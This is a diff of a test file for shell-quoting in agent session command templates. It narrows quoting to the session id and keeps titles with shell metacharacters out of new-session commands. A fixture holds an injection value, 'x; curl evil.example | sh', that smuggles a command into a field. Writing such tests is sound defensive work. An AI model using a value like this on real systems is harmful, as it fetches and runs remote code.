@@ -35,21 +35,23 @@ describe('command template quoting', () => {
     title: 'a`b$c',
   } as never;
 
-  it('quotes every substitution in applyResumeTemplate', () => {
+  it('quotes only ${sessionId} in applyResumeTemplate', () => {
     const command = applyResumeTemplate(
       'claude --resume ${sessionId} --cwd ${cwd} --title ${title}',
       record,
     );
     expect(command).toContain("'x; curl evil.example | sh'");
-    expect(command).toContain("'/tmp/with space'");
-    expect(command).toContain("'a`b$c'");
+    expect(command).toContain('${cwd}');
+    expect(command).toContain('${title}');
   });
 
-  it('quotes the name in new-session commands', () => {
+  it('passes --name only for plain-text titles', () => {
     const claude = createClaudeAdapter({ env: {} });
-    expect(claude.buildNewCommand({ sessionId: 'ok', name: 'a`b' })).toBe(
-      "claude --session-id ok --name 'a`b'",
+    expect(claude.buildNewCommand({ sessionId: 'ok', name: 'Plain name' })).toBe(
+      "claude --session-id ok --name 'Plain name'",
     );
+    // Titles with shell metacharacters are not passed to the agent.
+    expect(claude.buildNewCommand({ sessionId: 'ok', name: 'a`b' })).toBe('claude --session-id ok');
     const pi = createPiAdapter({ env: {} });
     expect(pi.buildNewCommand({ sessionId: 'ok', name: 'a b' })).toBe(
       "pi --session-id ok --name 'a b'",
